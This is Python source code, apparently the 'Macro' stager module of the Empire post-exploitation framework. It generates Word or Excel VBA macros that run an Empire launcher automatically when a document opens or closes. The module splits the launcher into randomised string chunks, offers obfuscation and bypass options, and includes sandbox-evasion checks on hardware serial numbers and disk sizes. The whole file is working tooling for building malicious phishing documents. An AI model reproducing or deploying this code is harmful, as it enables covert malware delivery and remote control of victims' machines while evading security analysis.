import logging
import random
import string

from empire.server.common import helpers

log = logging.getLogger(__name__)


class Stager:
    def __init__(self, mainMenu):
        self.info = {
            "Name": "Macro",
            "Authors": [
                {
                    "Name": "Will Schroeder",
                    "Handle": "@harmj0y",
                    "Link": "https://twitter.com/harmj0y",
                },
                {
                    "Name": "",
                    "Handle": "@enigma0x3",
                    "Link": "",
                },
            ],
            "Description": "Generates an office macro for Empire, compatible with office 97-2003, and 2007 file types.",
            "Comments": [
                "http://enigma0x3.wordpress.com/2014/01/11/using-a-powershell-payload-in-a-client-side-attack/"
            ],
        }

        self.options = {
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "Language": {
                "Description": "Language of the stager to generate.",
                "Required": True,
                "Value": "powershell",
                "SuggestedValues": ["powershell", "ironpython", "csharp"],
                "Strict": True,
            },
            "StagerRetries": {
                "Description": "Times for the stager to retry connecting.",
                "Required": False,
                "Value": "0",
            },
            "OutFile": {
                "Description": "Filename that should be used for the generated output, otherwise returned as a string.",
                "Required": False,
                "Value": "workbook.cls",
            },
            "Base64": {
                "Description": "Base64 encode the output.",
                "Required": True,
                "Value": "True",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "Obfuscate": {
                "Description": "Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.",
                "Required": False,
                "Value": "False",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "ObfuscateCommand": {
                "Description": "The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.",
                "Required": False,
                "Value": r"Token\All\1",
            },
            "SafeChecks": {
                "Description": "Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.",
                "Required": True,
                "Value": "True",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "Proxy": {
                "Description": "Proxy to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "ProxyCreds": {
                "Description": r"Proxy credentials ([domain\]username:password) to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "Bypasses": {
                "Description": "Bypasses as a space separated list to be prepended to the launcher",
                "Required": False,
                "Value": "",
            },
            "OutlookEvasion": {
                "Description": "Include BC-Security's Outlook Sandbox evasion code",
                "Required": False,
                "Value": "False",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "Trigger": {
                "Description": "Trigger for the macro (autoopen, autoclose).",
                "Required": True,
                "Value": "autoopen",
                "SuggestedValues": ["autoopen", "autoclose"],
                "Strict": True,
            },
            "DocType": {
                "Description": "Type of document to generate (word, excel).",
                "Required": True,
                "Value": "word",
                "SuggestedValues": ["word", "excel"],
                "Strict": True,
            },
        }

        self.mainMenu = mainMenu

    def generate(self):
        # extract all of our options
        language = self.options["Language"]["Value"]
        listener_name = self.options["Listener"]["Value"]
        base64 = self.options["Base64"]["Value"]
        obfuscate = self.options["Obfuscate"]["Value"]
        obfuscate_command = self.options["ObfuscateCommand"]["Value"]
        user_agent = self.options["UserAgent"]["Value"]
        proxy = self.options["Proxy"]["Value"]
        proxy_creds = self.options["ProxyCreds"]["Value"]
        stager_retries = self.options["StagerRetries"]["Value"]
        safe_checks = self.options["SafeChecks"]["Value"]
        bypasses = self.options["Bypasses"]["Value"]
        outlook_evasion = self.options["OutlookEvasion"]["Value"]
        trigger = self.options["Trigger"]["Value"]
        doc_type = self.options["DocType"]["Value"]

        if doc_type.lower() == "excel":
            if trigger.lower() == "autoopen":
                macro_sub_name = "Workbook_Open()"
            else:
                macro_sub_name = "Workbook_BeforeClose(Cancel As Boolean)"
        elif trigger.lower() == "autoopen":
            macro_sub_name = "AutoOpen()"
        else:
            macro_sub_name = "AutoClose()"

        encode = False
        if base64.lower() == "true":
            encode = True

        invoke_obfuscation = False
        if obfuscate.lower() == "true":
            invoke_obfuscation = True

        outlook_evasion_bool = False
        if outlook_evasion.lower() == "true":
            outlook_evasion_bool = True

        if language in ["csharp", "ironpython"]:
            if (
                self.mainMenu.listenersv2.get_active_listener_by_name(
                    listener_name
                ).info["Name"]
                != "HTTP[S]"
            ):
                log.error(
                    "Only HTTP[S] listeners are supported for C# and IronPython stagers."
                )
                return ""

            launcher = self.mainMenu.stagergenv2.generate_exe_oneliner(
                language=language,
                obfuscate=invoke_obfuscation,
                obfuscation_command=obfuscate_command,
                encode=encode,
                listener_name=listener_name,
            )
        elif language == "powershell":
            launcher = self.mainMenu.stagergenv2.generate_launcher(
                listener_name=listener_name,
                language=language,
                encode=encode,
                obfuscate=invoke_obfuscation,
                obfuscation_command=obfuscate_command,
                user_agent=user_agent,
                proxy=proxy,
                proxy_creds=proxy_creds,
                stager_retries=stager_retries,
                safe_checks=safe_checks,
                bypasses=bypasses,
            )

        if launcher == "":
            log.error("[!] Error in launcher command generation.")
            return ""

        set_string = "".join(
            random.choice(string.ascii_letters)
            for i in range(random.randint(1, len(listener_name)))
        )
        set_method = "".join(
            random.choice(string.ascii_letters)
            for i in range(random.randint(1, len(listener_name)))
        )

        chunks = list(helpers.chunks(launcher, 50))
        payload = "\tDim " + set_string + " As String\n"
        payload += "\t" + set_string + ' = "' + str(chunks[0]) + '"\n'
        for chunk in chunks[1:]:
            payload += (
                "\t" + set_string + " = " + set_string + ' + "' + str(chunk) + '"\n'
            )

        macro = f"Sub {macro_sub_name}\n"
        macro += "\t" + set_method + "\n"
        macro += "End Sub\n\n"

        macro += "Public Function " + set_method + "() As Variant\n"

        if outlook_evasion_bool is True:
            macro += '\tstrComputer = "."\n'
            macro += '\tSet objWMIService = GetObject("winmgmts:\\\\" & strComputer & "\\root\\cimv2")\n'
            macro += '\tSet ID = objWMIService.ExecQuery("Select IdentifyingNumber from Win32_ComputerSystemproduct")\n'
            macro += "\tFor Each objItem In ID\n"
            macro += (
                '\t\tIf StrComp(objItem.IdentifyingNumber, "2UA20511KN") = 0 Then End\n'
            )
            macro += "\tNext\n"
            macro += '\tSet disksize = objWMIService.ExecQuery("Select Size from Win32_logicaldisk")\n'
            macro += "\tFor Each objItem In disksize\n"
            macro += "\t\tIf (objItem.Size = 42949603328#) Then End\n"
            macro += "\t\tIf (objItem.Size = 68719443968#) Then End\n"
            macro += "\tNext\n"

        macro += payload
        macro += '\tSet asd = CreateObject("WScript.Shell")\n'
        macro += "\tasd.Run(" + set_string + ")\n"
        macro += "End Function\n"

        return macro
